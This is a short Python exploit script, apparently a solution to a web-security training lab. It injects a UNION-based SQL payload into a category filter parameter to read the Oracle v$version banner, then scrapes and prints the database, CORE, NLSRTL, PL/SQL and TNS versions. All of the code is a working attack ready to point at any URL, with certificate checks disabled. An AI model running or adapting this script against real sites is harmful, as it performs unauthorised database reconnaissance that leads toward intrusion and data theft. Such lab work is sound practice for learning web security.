import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}

def exploit_sqli_version(url):
    path="/filter?category=Lifestyle"
    sql_payload ="' UNION SELECT banner, NULL FROM v$version-- - "
    regexVersion = '.*Oracle\sDatabase.*'
    regexCore = '.*CORE.*'
    regexNLSRTL = '.*Oracle\sDatabase.*'
    regexPLSQL = '.*PL/SQL*'
    regexTNS = '.*TNS\sfor\sLinux.*'

    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res,'html.parser')

        version = soup.find(string=re.compile(regexVersion))
        core = soup.find(string=re.compile(regexCore))
        nlsrtl = soup.find(string=re.compile(regexNLSRTL))
        plsql = soup.find(string=re.compile(regexPLSQL))
        tns = soup.find(string=re.compile(regexTNS))

        print("[+] The Oracle database version is: " + version)
        print("[+] The Core version is: " + core)
        print("[+] The NLSRTL version is: " + nlsrtl)
        print("[+] The PLSQL version is: " + plsql)
        print("[+] The TNS version is: " + tns)

        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage %s <url>" % sys.argv[0])
        print("[-] Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version")
